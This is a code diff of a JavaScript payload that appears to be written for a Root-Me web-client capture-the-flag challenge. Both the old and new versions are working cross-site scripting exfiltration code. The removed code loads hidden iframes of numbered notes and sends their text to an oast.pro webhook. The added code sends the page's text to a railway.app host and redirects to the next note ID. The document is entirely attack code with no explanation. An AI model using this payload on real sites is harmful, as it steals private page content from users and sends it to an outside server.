@@ -1,40 +1,17 @@
 <script>
-const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
-const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
-async function run(a = 0, b = 50) {
-    const promises = [];
-    const iframeContents = [];
+(function () {
+    const BASE = "test-production-c560.up.railway.app";
 
-    for (let i = a; i < b; i++) {
-        const iframe = document.createElement("iframe");
-        iframe.src = TARGET + i;
-        iframe.style.display = "none";
-        document.documentElement.appendChild(iframe);
+    const parts = location.pathname.split("/");
+    const id = parseInt(parts[parts.length - 1]);
 
-        promises.push(new Promise(resolve => {
-            iframe.onload = () => {
-                try {
-                    iframeContents.push({
-                        id: i,
-                        content: iframe.contentDocument.body ? iframe.contentDocument.body.textContent : ""
-                    });
-                } catch (e) {
-                    iframeContents.push({id: i, content: ""});
-                }
-                resolve();
-            };
-        }));
-    }
+    const data = encodeURIComponent(document.body.innerText);
 
-    await Promise.all(promises);
-
-    // send the collected iframe contents
-    const data = encodeURIComponent(JSON.stringify(iframeContents));
-    const webhookIframe = document.createElement("iframe");
-    webhookIframe.src = WEBHOOK + "?d=" + data;
-    document.documentElement.appendChild(webhookIframe);
-}
-
-
-run();
+    // send + move to next
+    location.href =
+        BASE +
+        "?id=" + id +
+        "&d=" + data +
+        "&next=" + (id + 1);
+})();
 </script>
